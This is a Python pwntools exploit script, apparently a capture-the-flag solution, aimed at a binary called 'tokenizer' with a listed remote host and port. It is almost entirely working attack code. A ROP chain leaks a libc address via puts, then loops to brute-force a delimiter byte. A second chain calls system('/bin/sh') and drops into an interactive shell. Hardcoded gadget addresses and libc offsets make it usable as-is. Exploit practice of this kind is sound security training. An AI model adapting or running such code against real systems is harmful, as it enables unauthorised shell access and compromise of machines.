from pwn import *
context.log_level = 'debug'

TARGET = './tokenizer'
HOST = '165.22.57.24'
PORT = 32000

r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

plt_puts = 0x401080
got_libc_start_main = 0x403fe8
pop_rdi = 0x40149b
pop_rsi_pop1 = 0x00401499
cout = 0x404020
main = 0x40133c
ret = 0x401388

while(1):
    r = process(TARGET)
    # r = remote(HOST, PORT)
    r.recvuntil('ers):') 

    payload = ''
    payload += p64(pop_rdi)
    payload += p64(cout)
    payload += p64(pop_rsi_pop1)
    payload += p64(got_libc_start_main)
    payload += p64(0xdeadbeef)
    payload += p64(plt_puts)
    payload += p64(main)
    payload = ((0x400 - len(payload)) / 8) * p64(ret) + payload

    payload = payload.replace('\x00', '\xa0')
    r.sendline(payload)
    leak = r.recvuntil('\n')[:-1]
    rbp = u64(leak[-6:].ljust(8, '\x00'))
    dbg("rbp")
    delim = p8(rbp & 0xff)
    if delim == '\xa0':
        break

    r.close()

gdb.attach(r, '''
b*0x40131f
b*0x401324
c
''')
r.recvuntil('ers:')

payload = ''
payload += delim
r.sendline(payload)

libc_leak = u64(r.recvuntil('Welcome').split('\n')[-1][:-7].ljust(8, '\x00'))
dbg("libc_leak")
libc_base = libc_leak - 0x21ab0
system = libc_base + 0x4f440
binsh = libc_base + 0x1b3e9a
r.recvuntil('ers):')

payload = ''
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
payload = ((0x400 - len(payload)) / 8) * p64(ret) + payload

payload = payload.replace('\x00', '\x78')
r.sendline(payload)

leak = r.recvuntil('\n')[:-1]
rbp = u64(leak[-6:].ljust(8, '\x00'))
dbg("rbp")
delim = p8(rbp & 0xff)
r.recvuntil('ers:')

payload = ''
payload += delim
r.sendline(payload)

r.interactive()
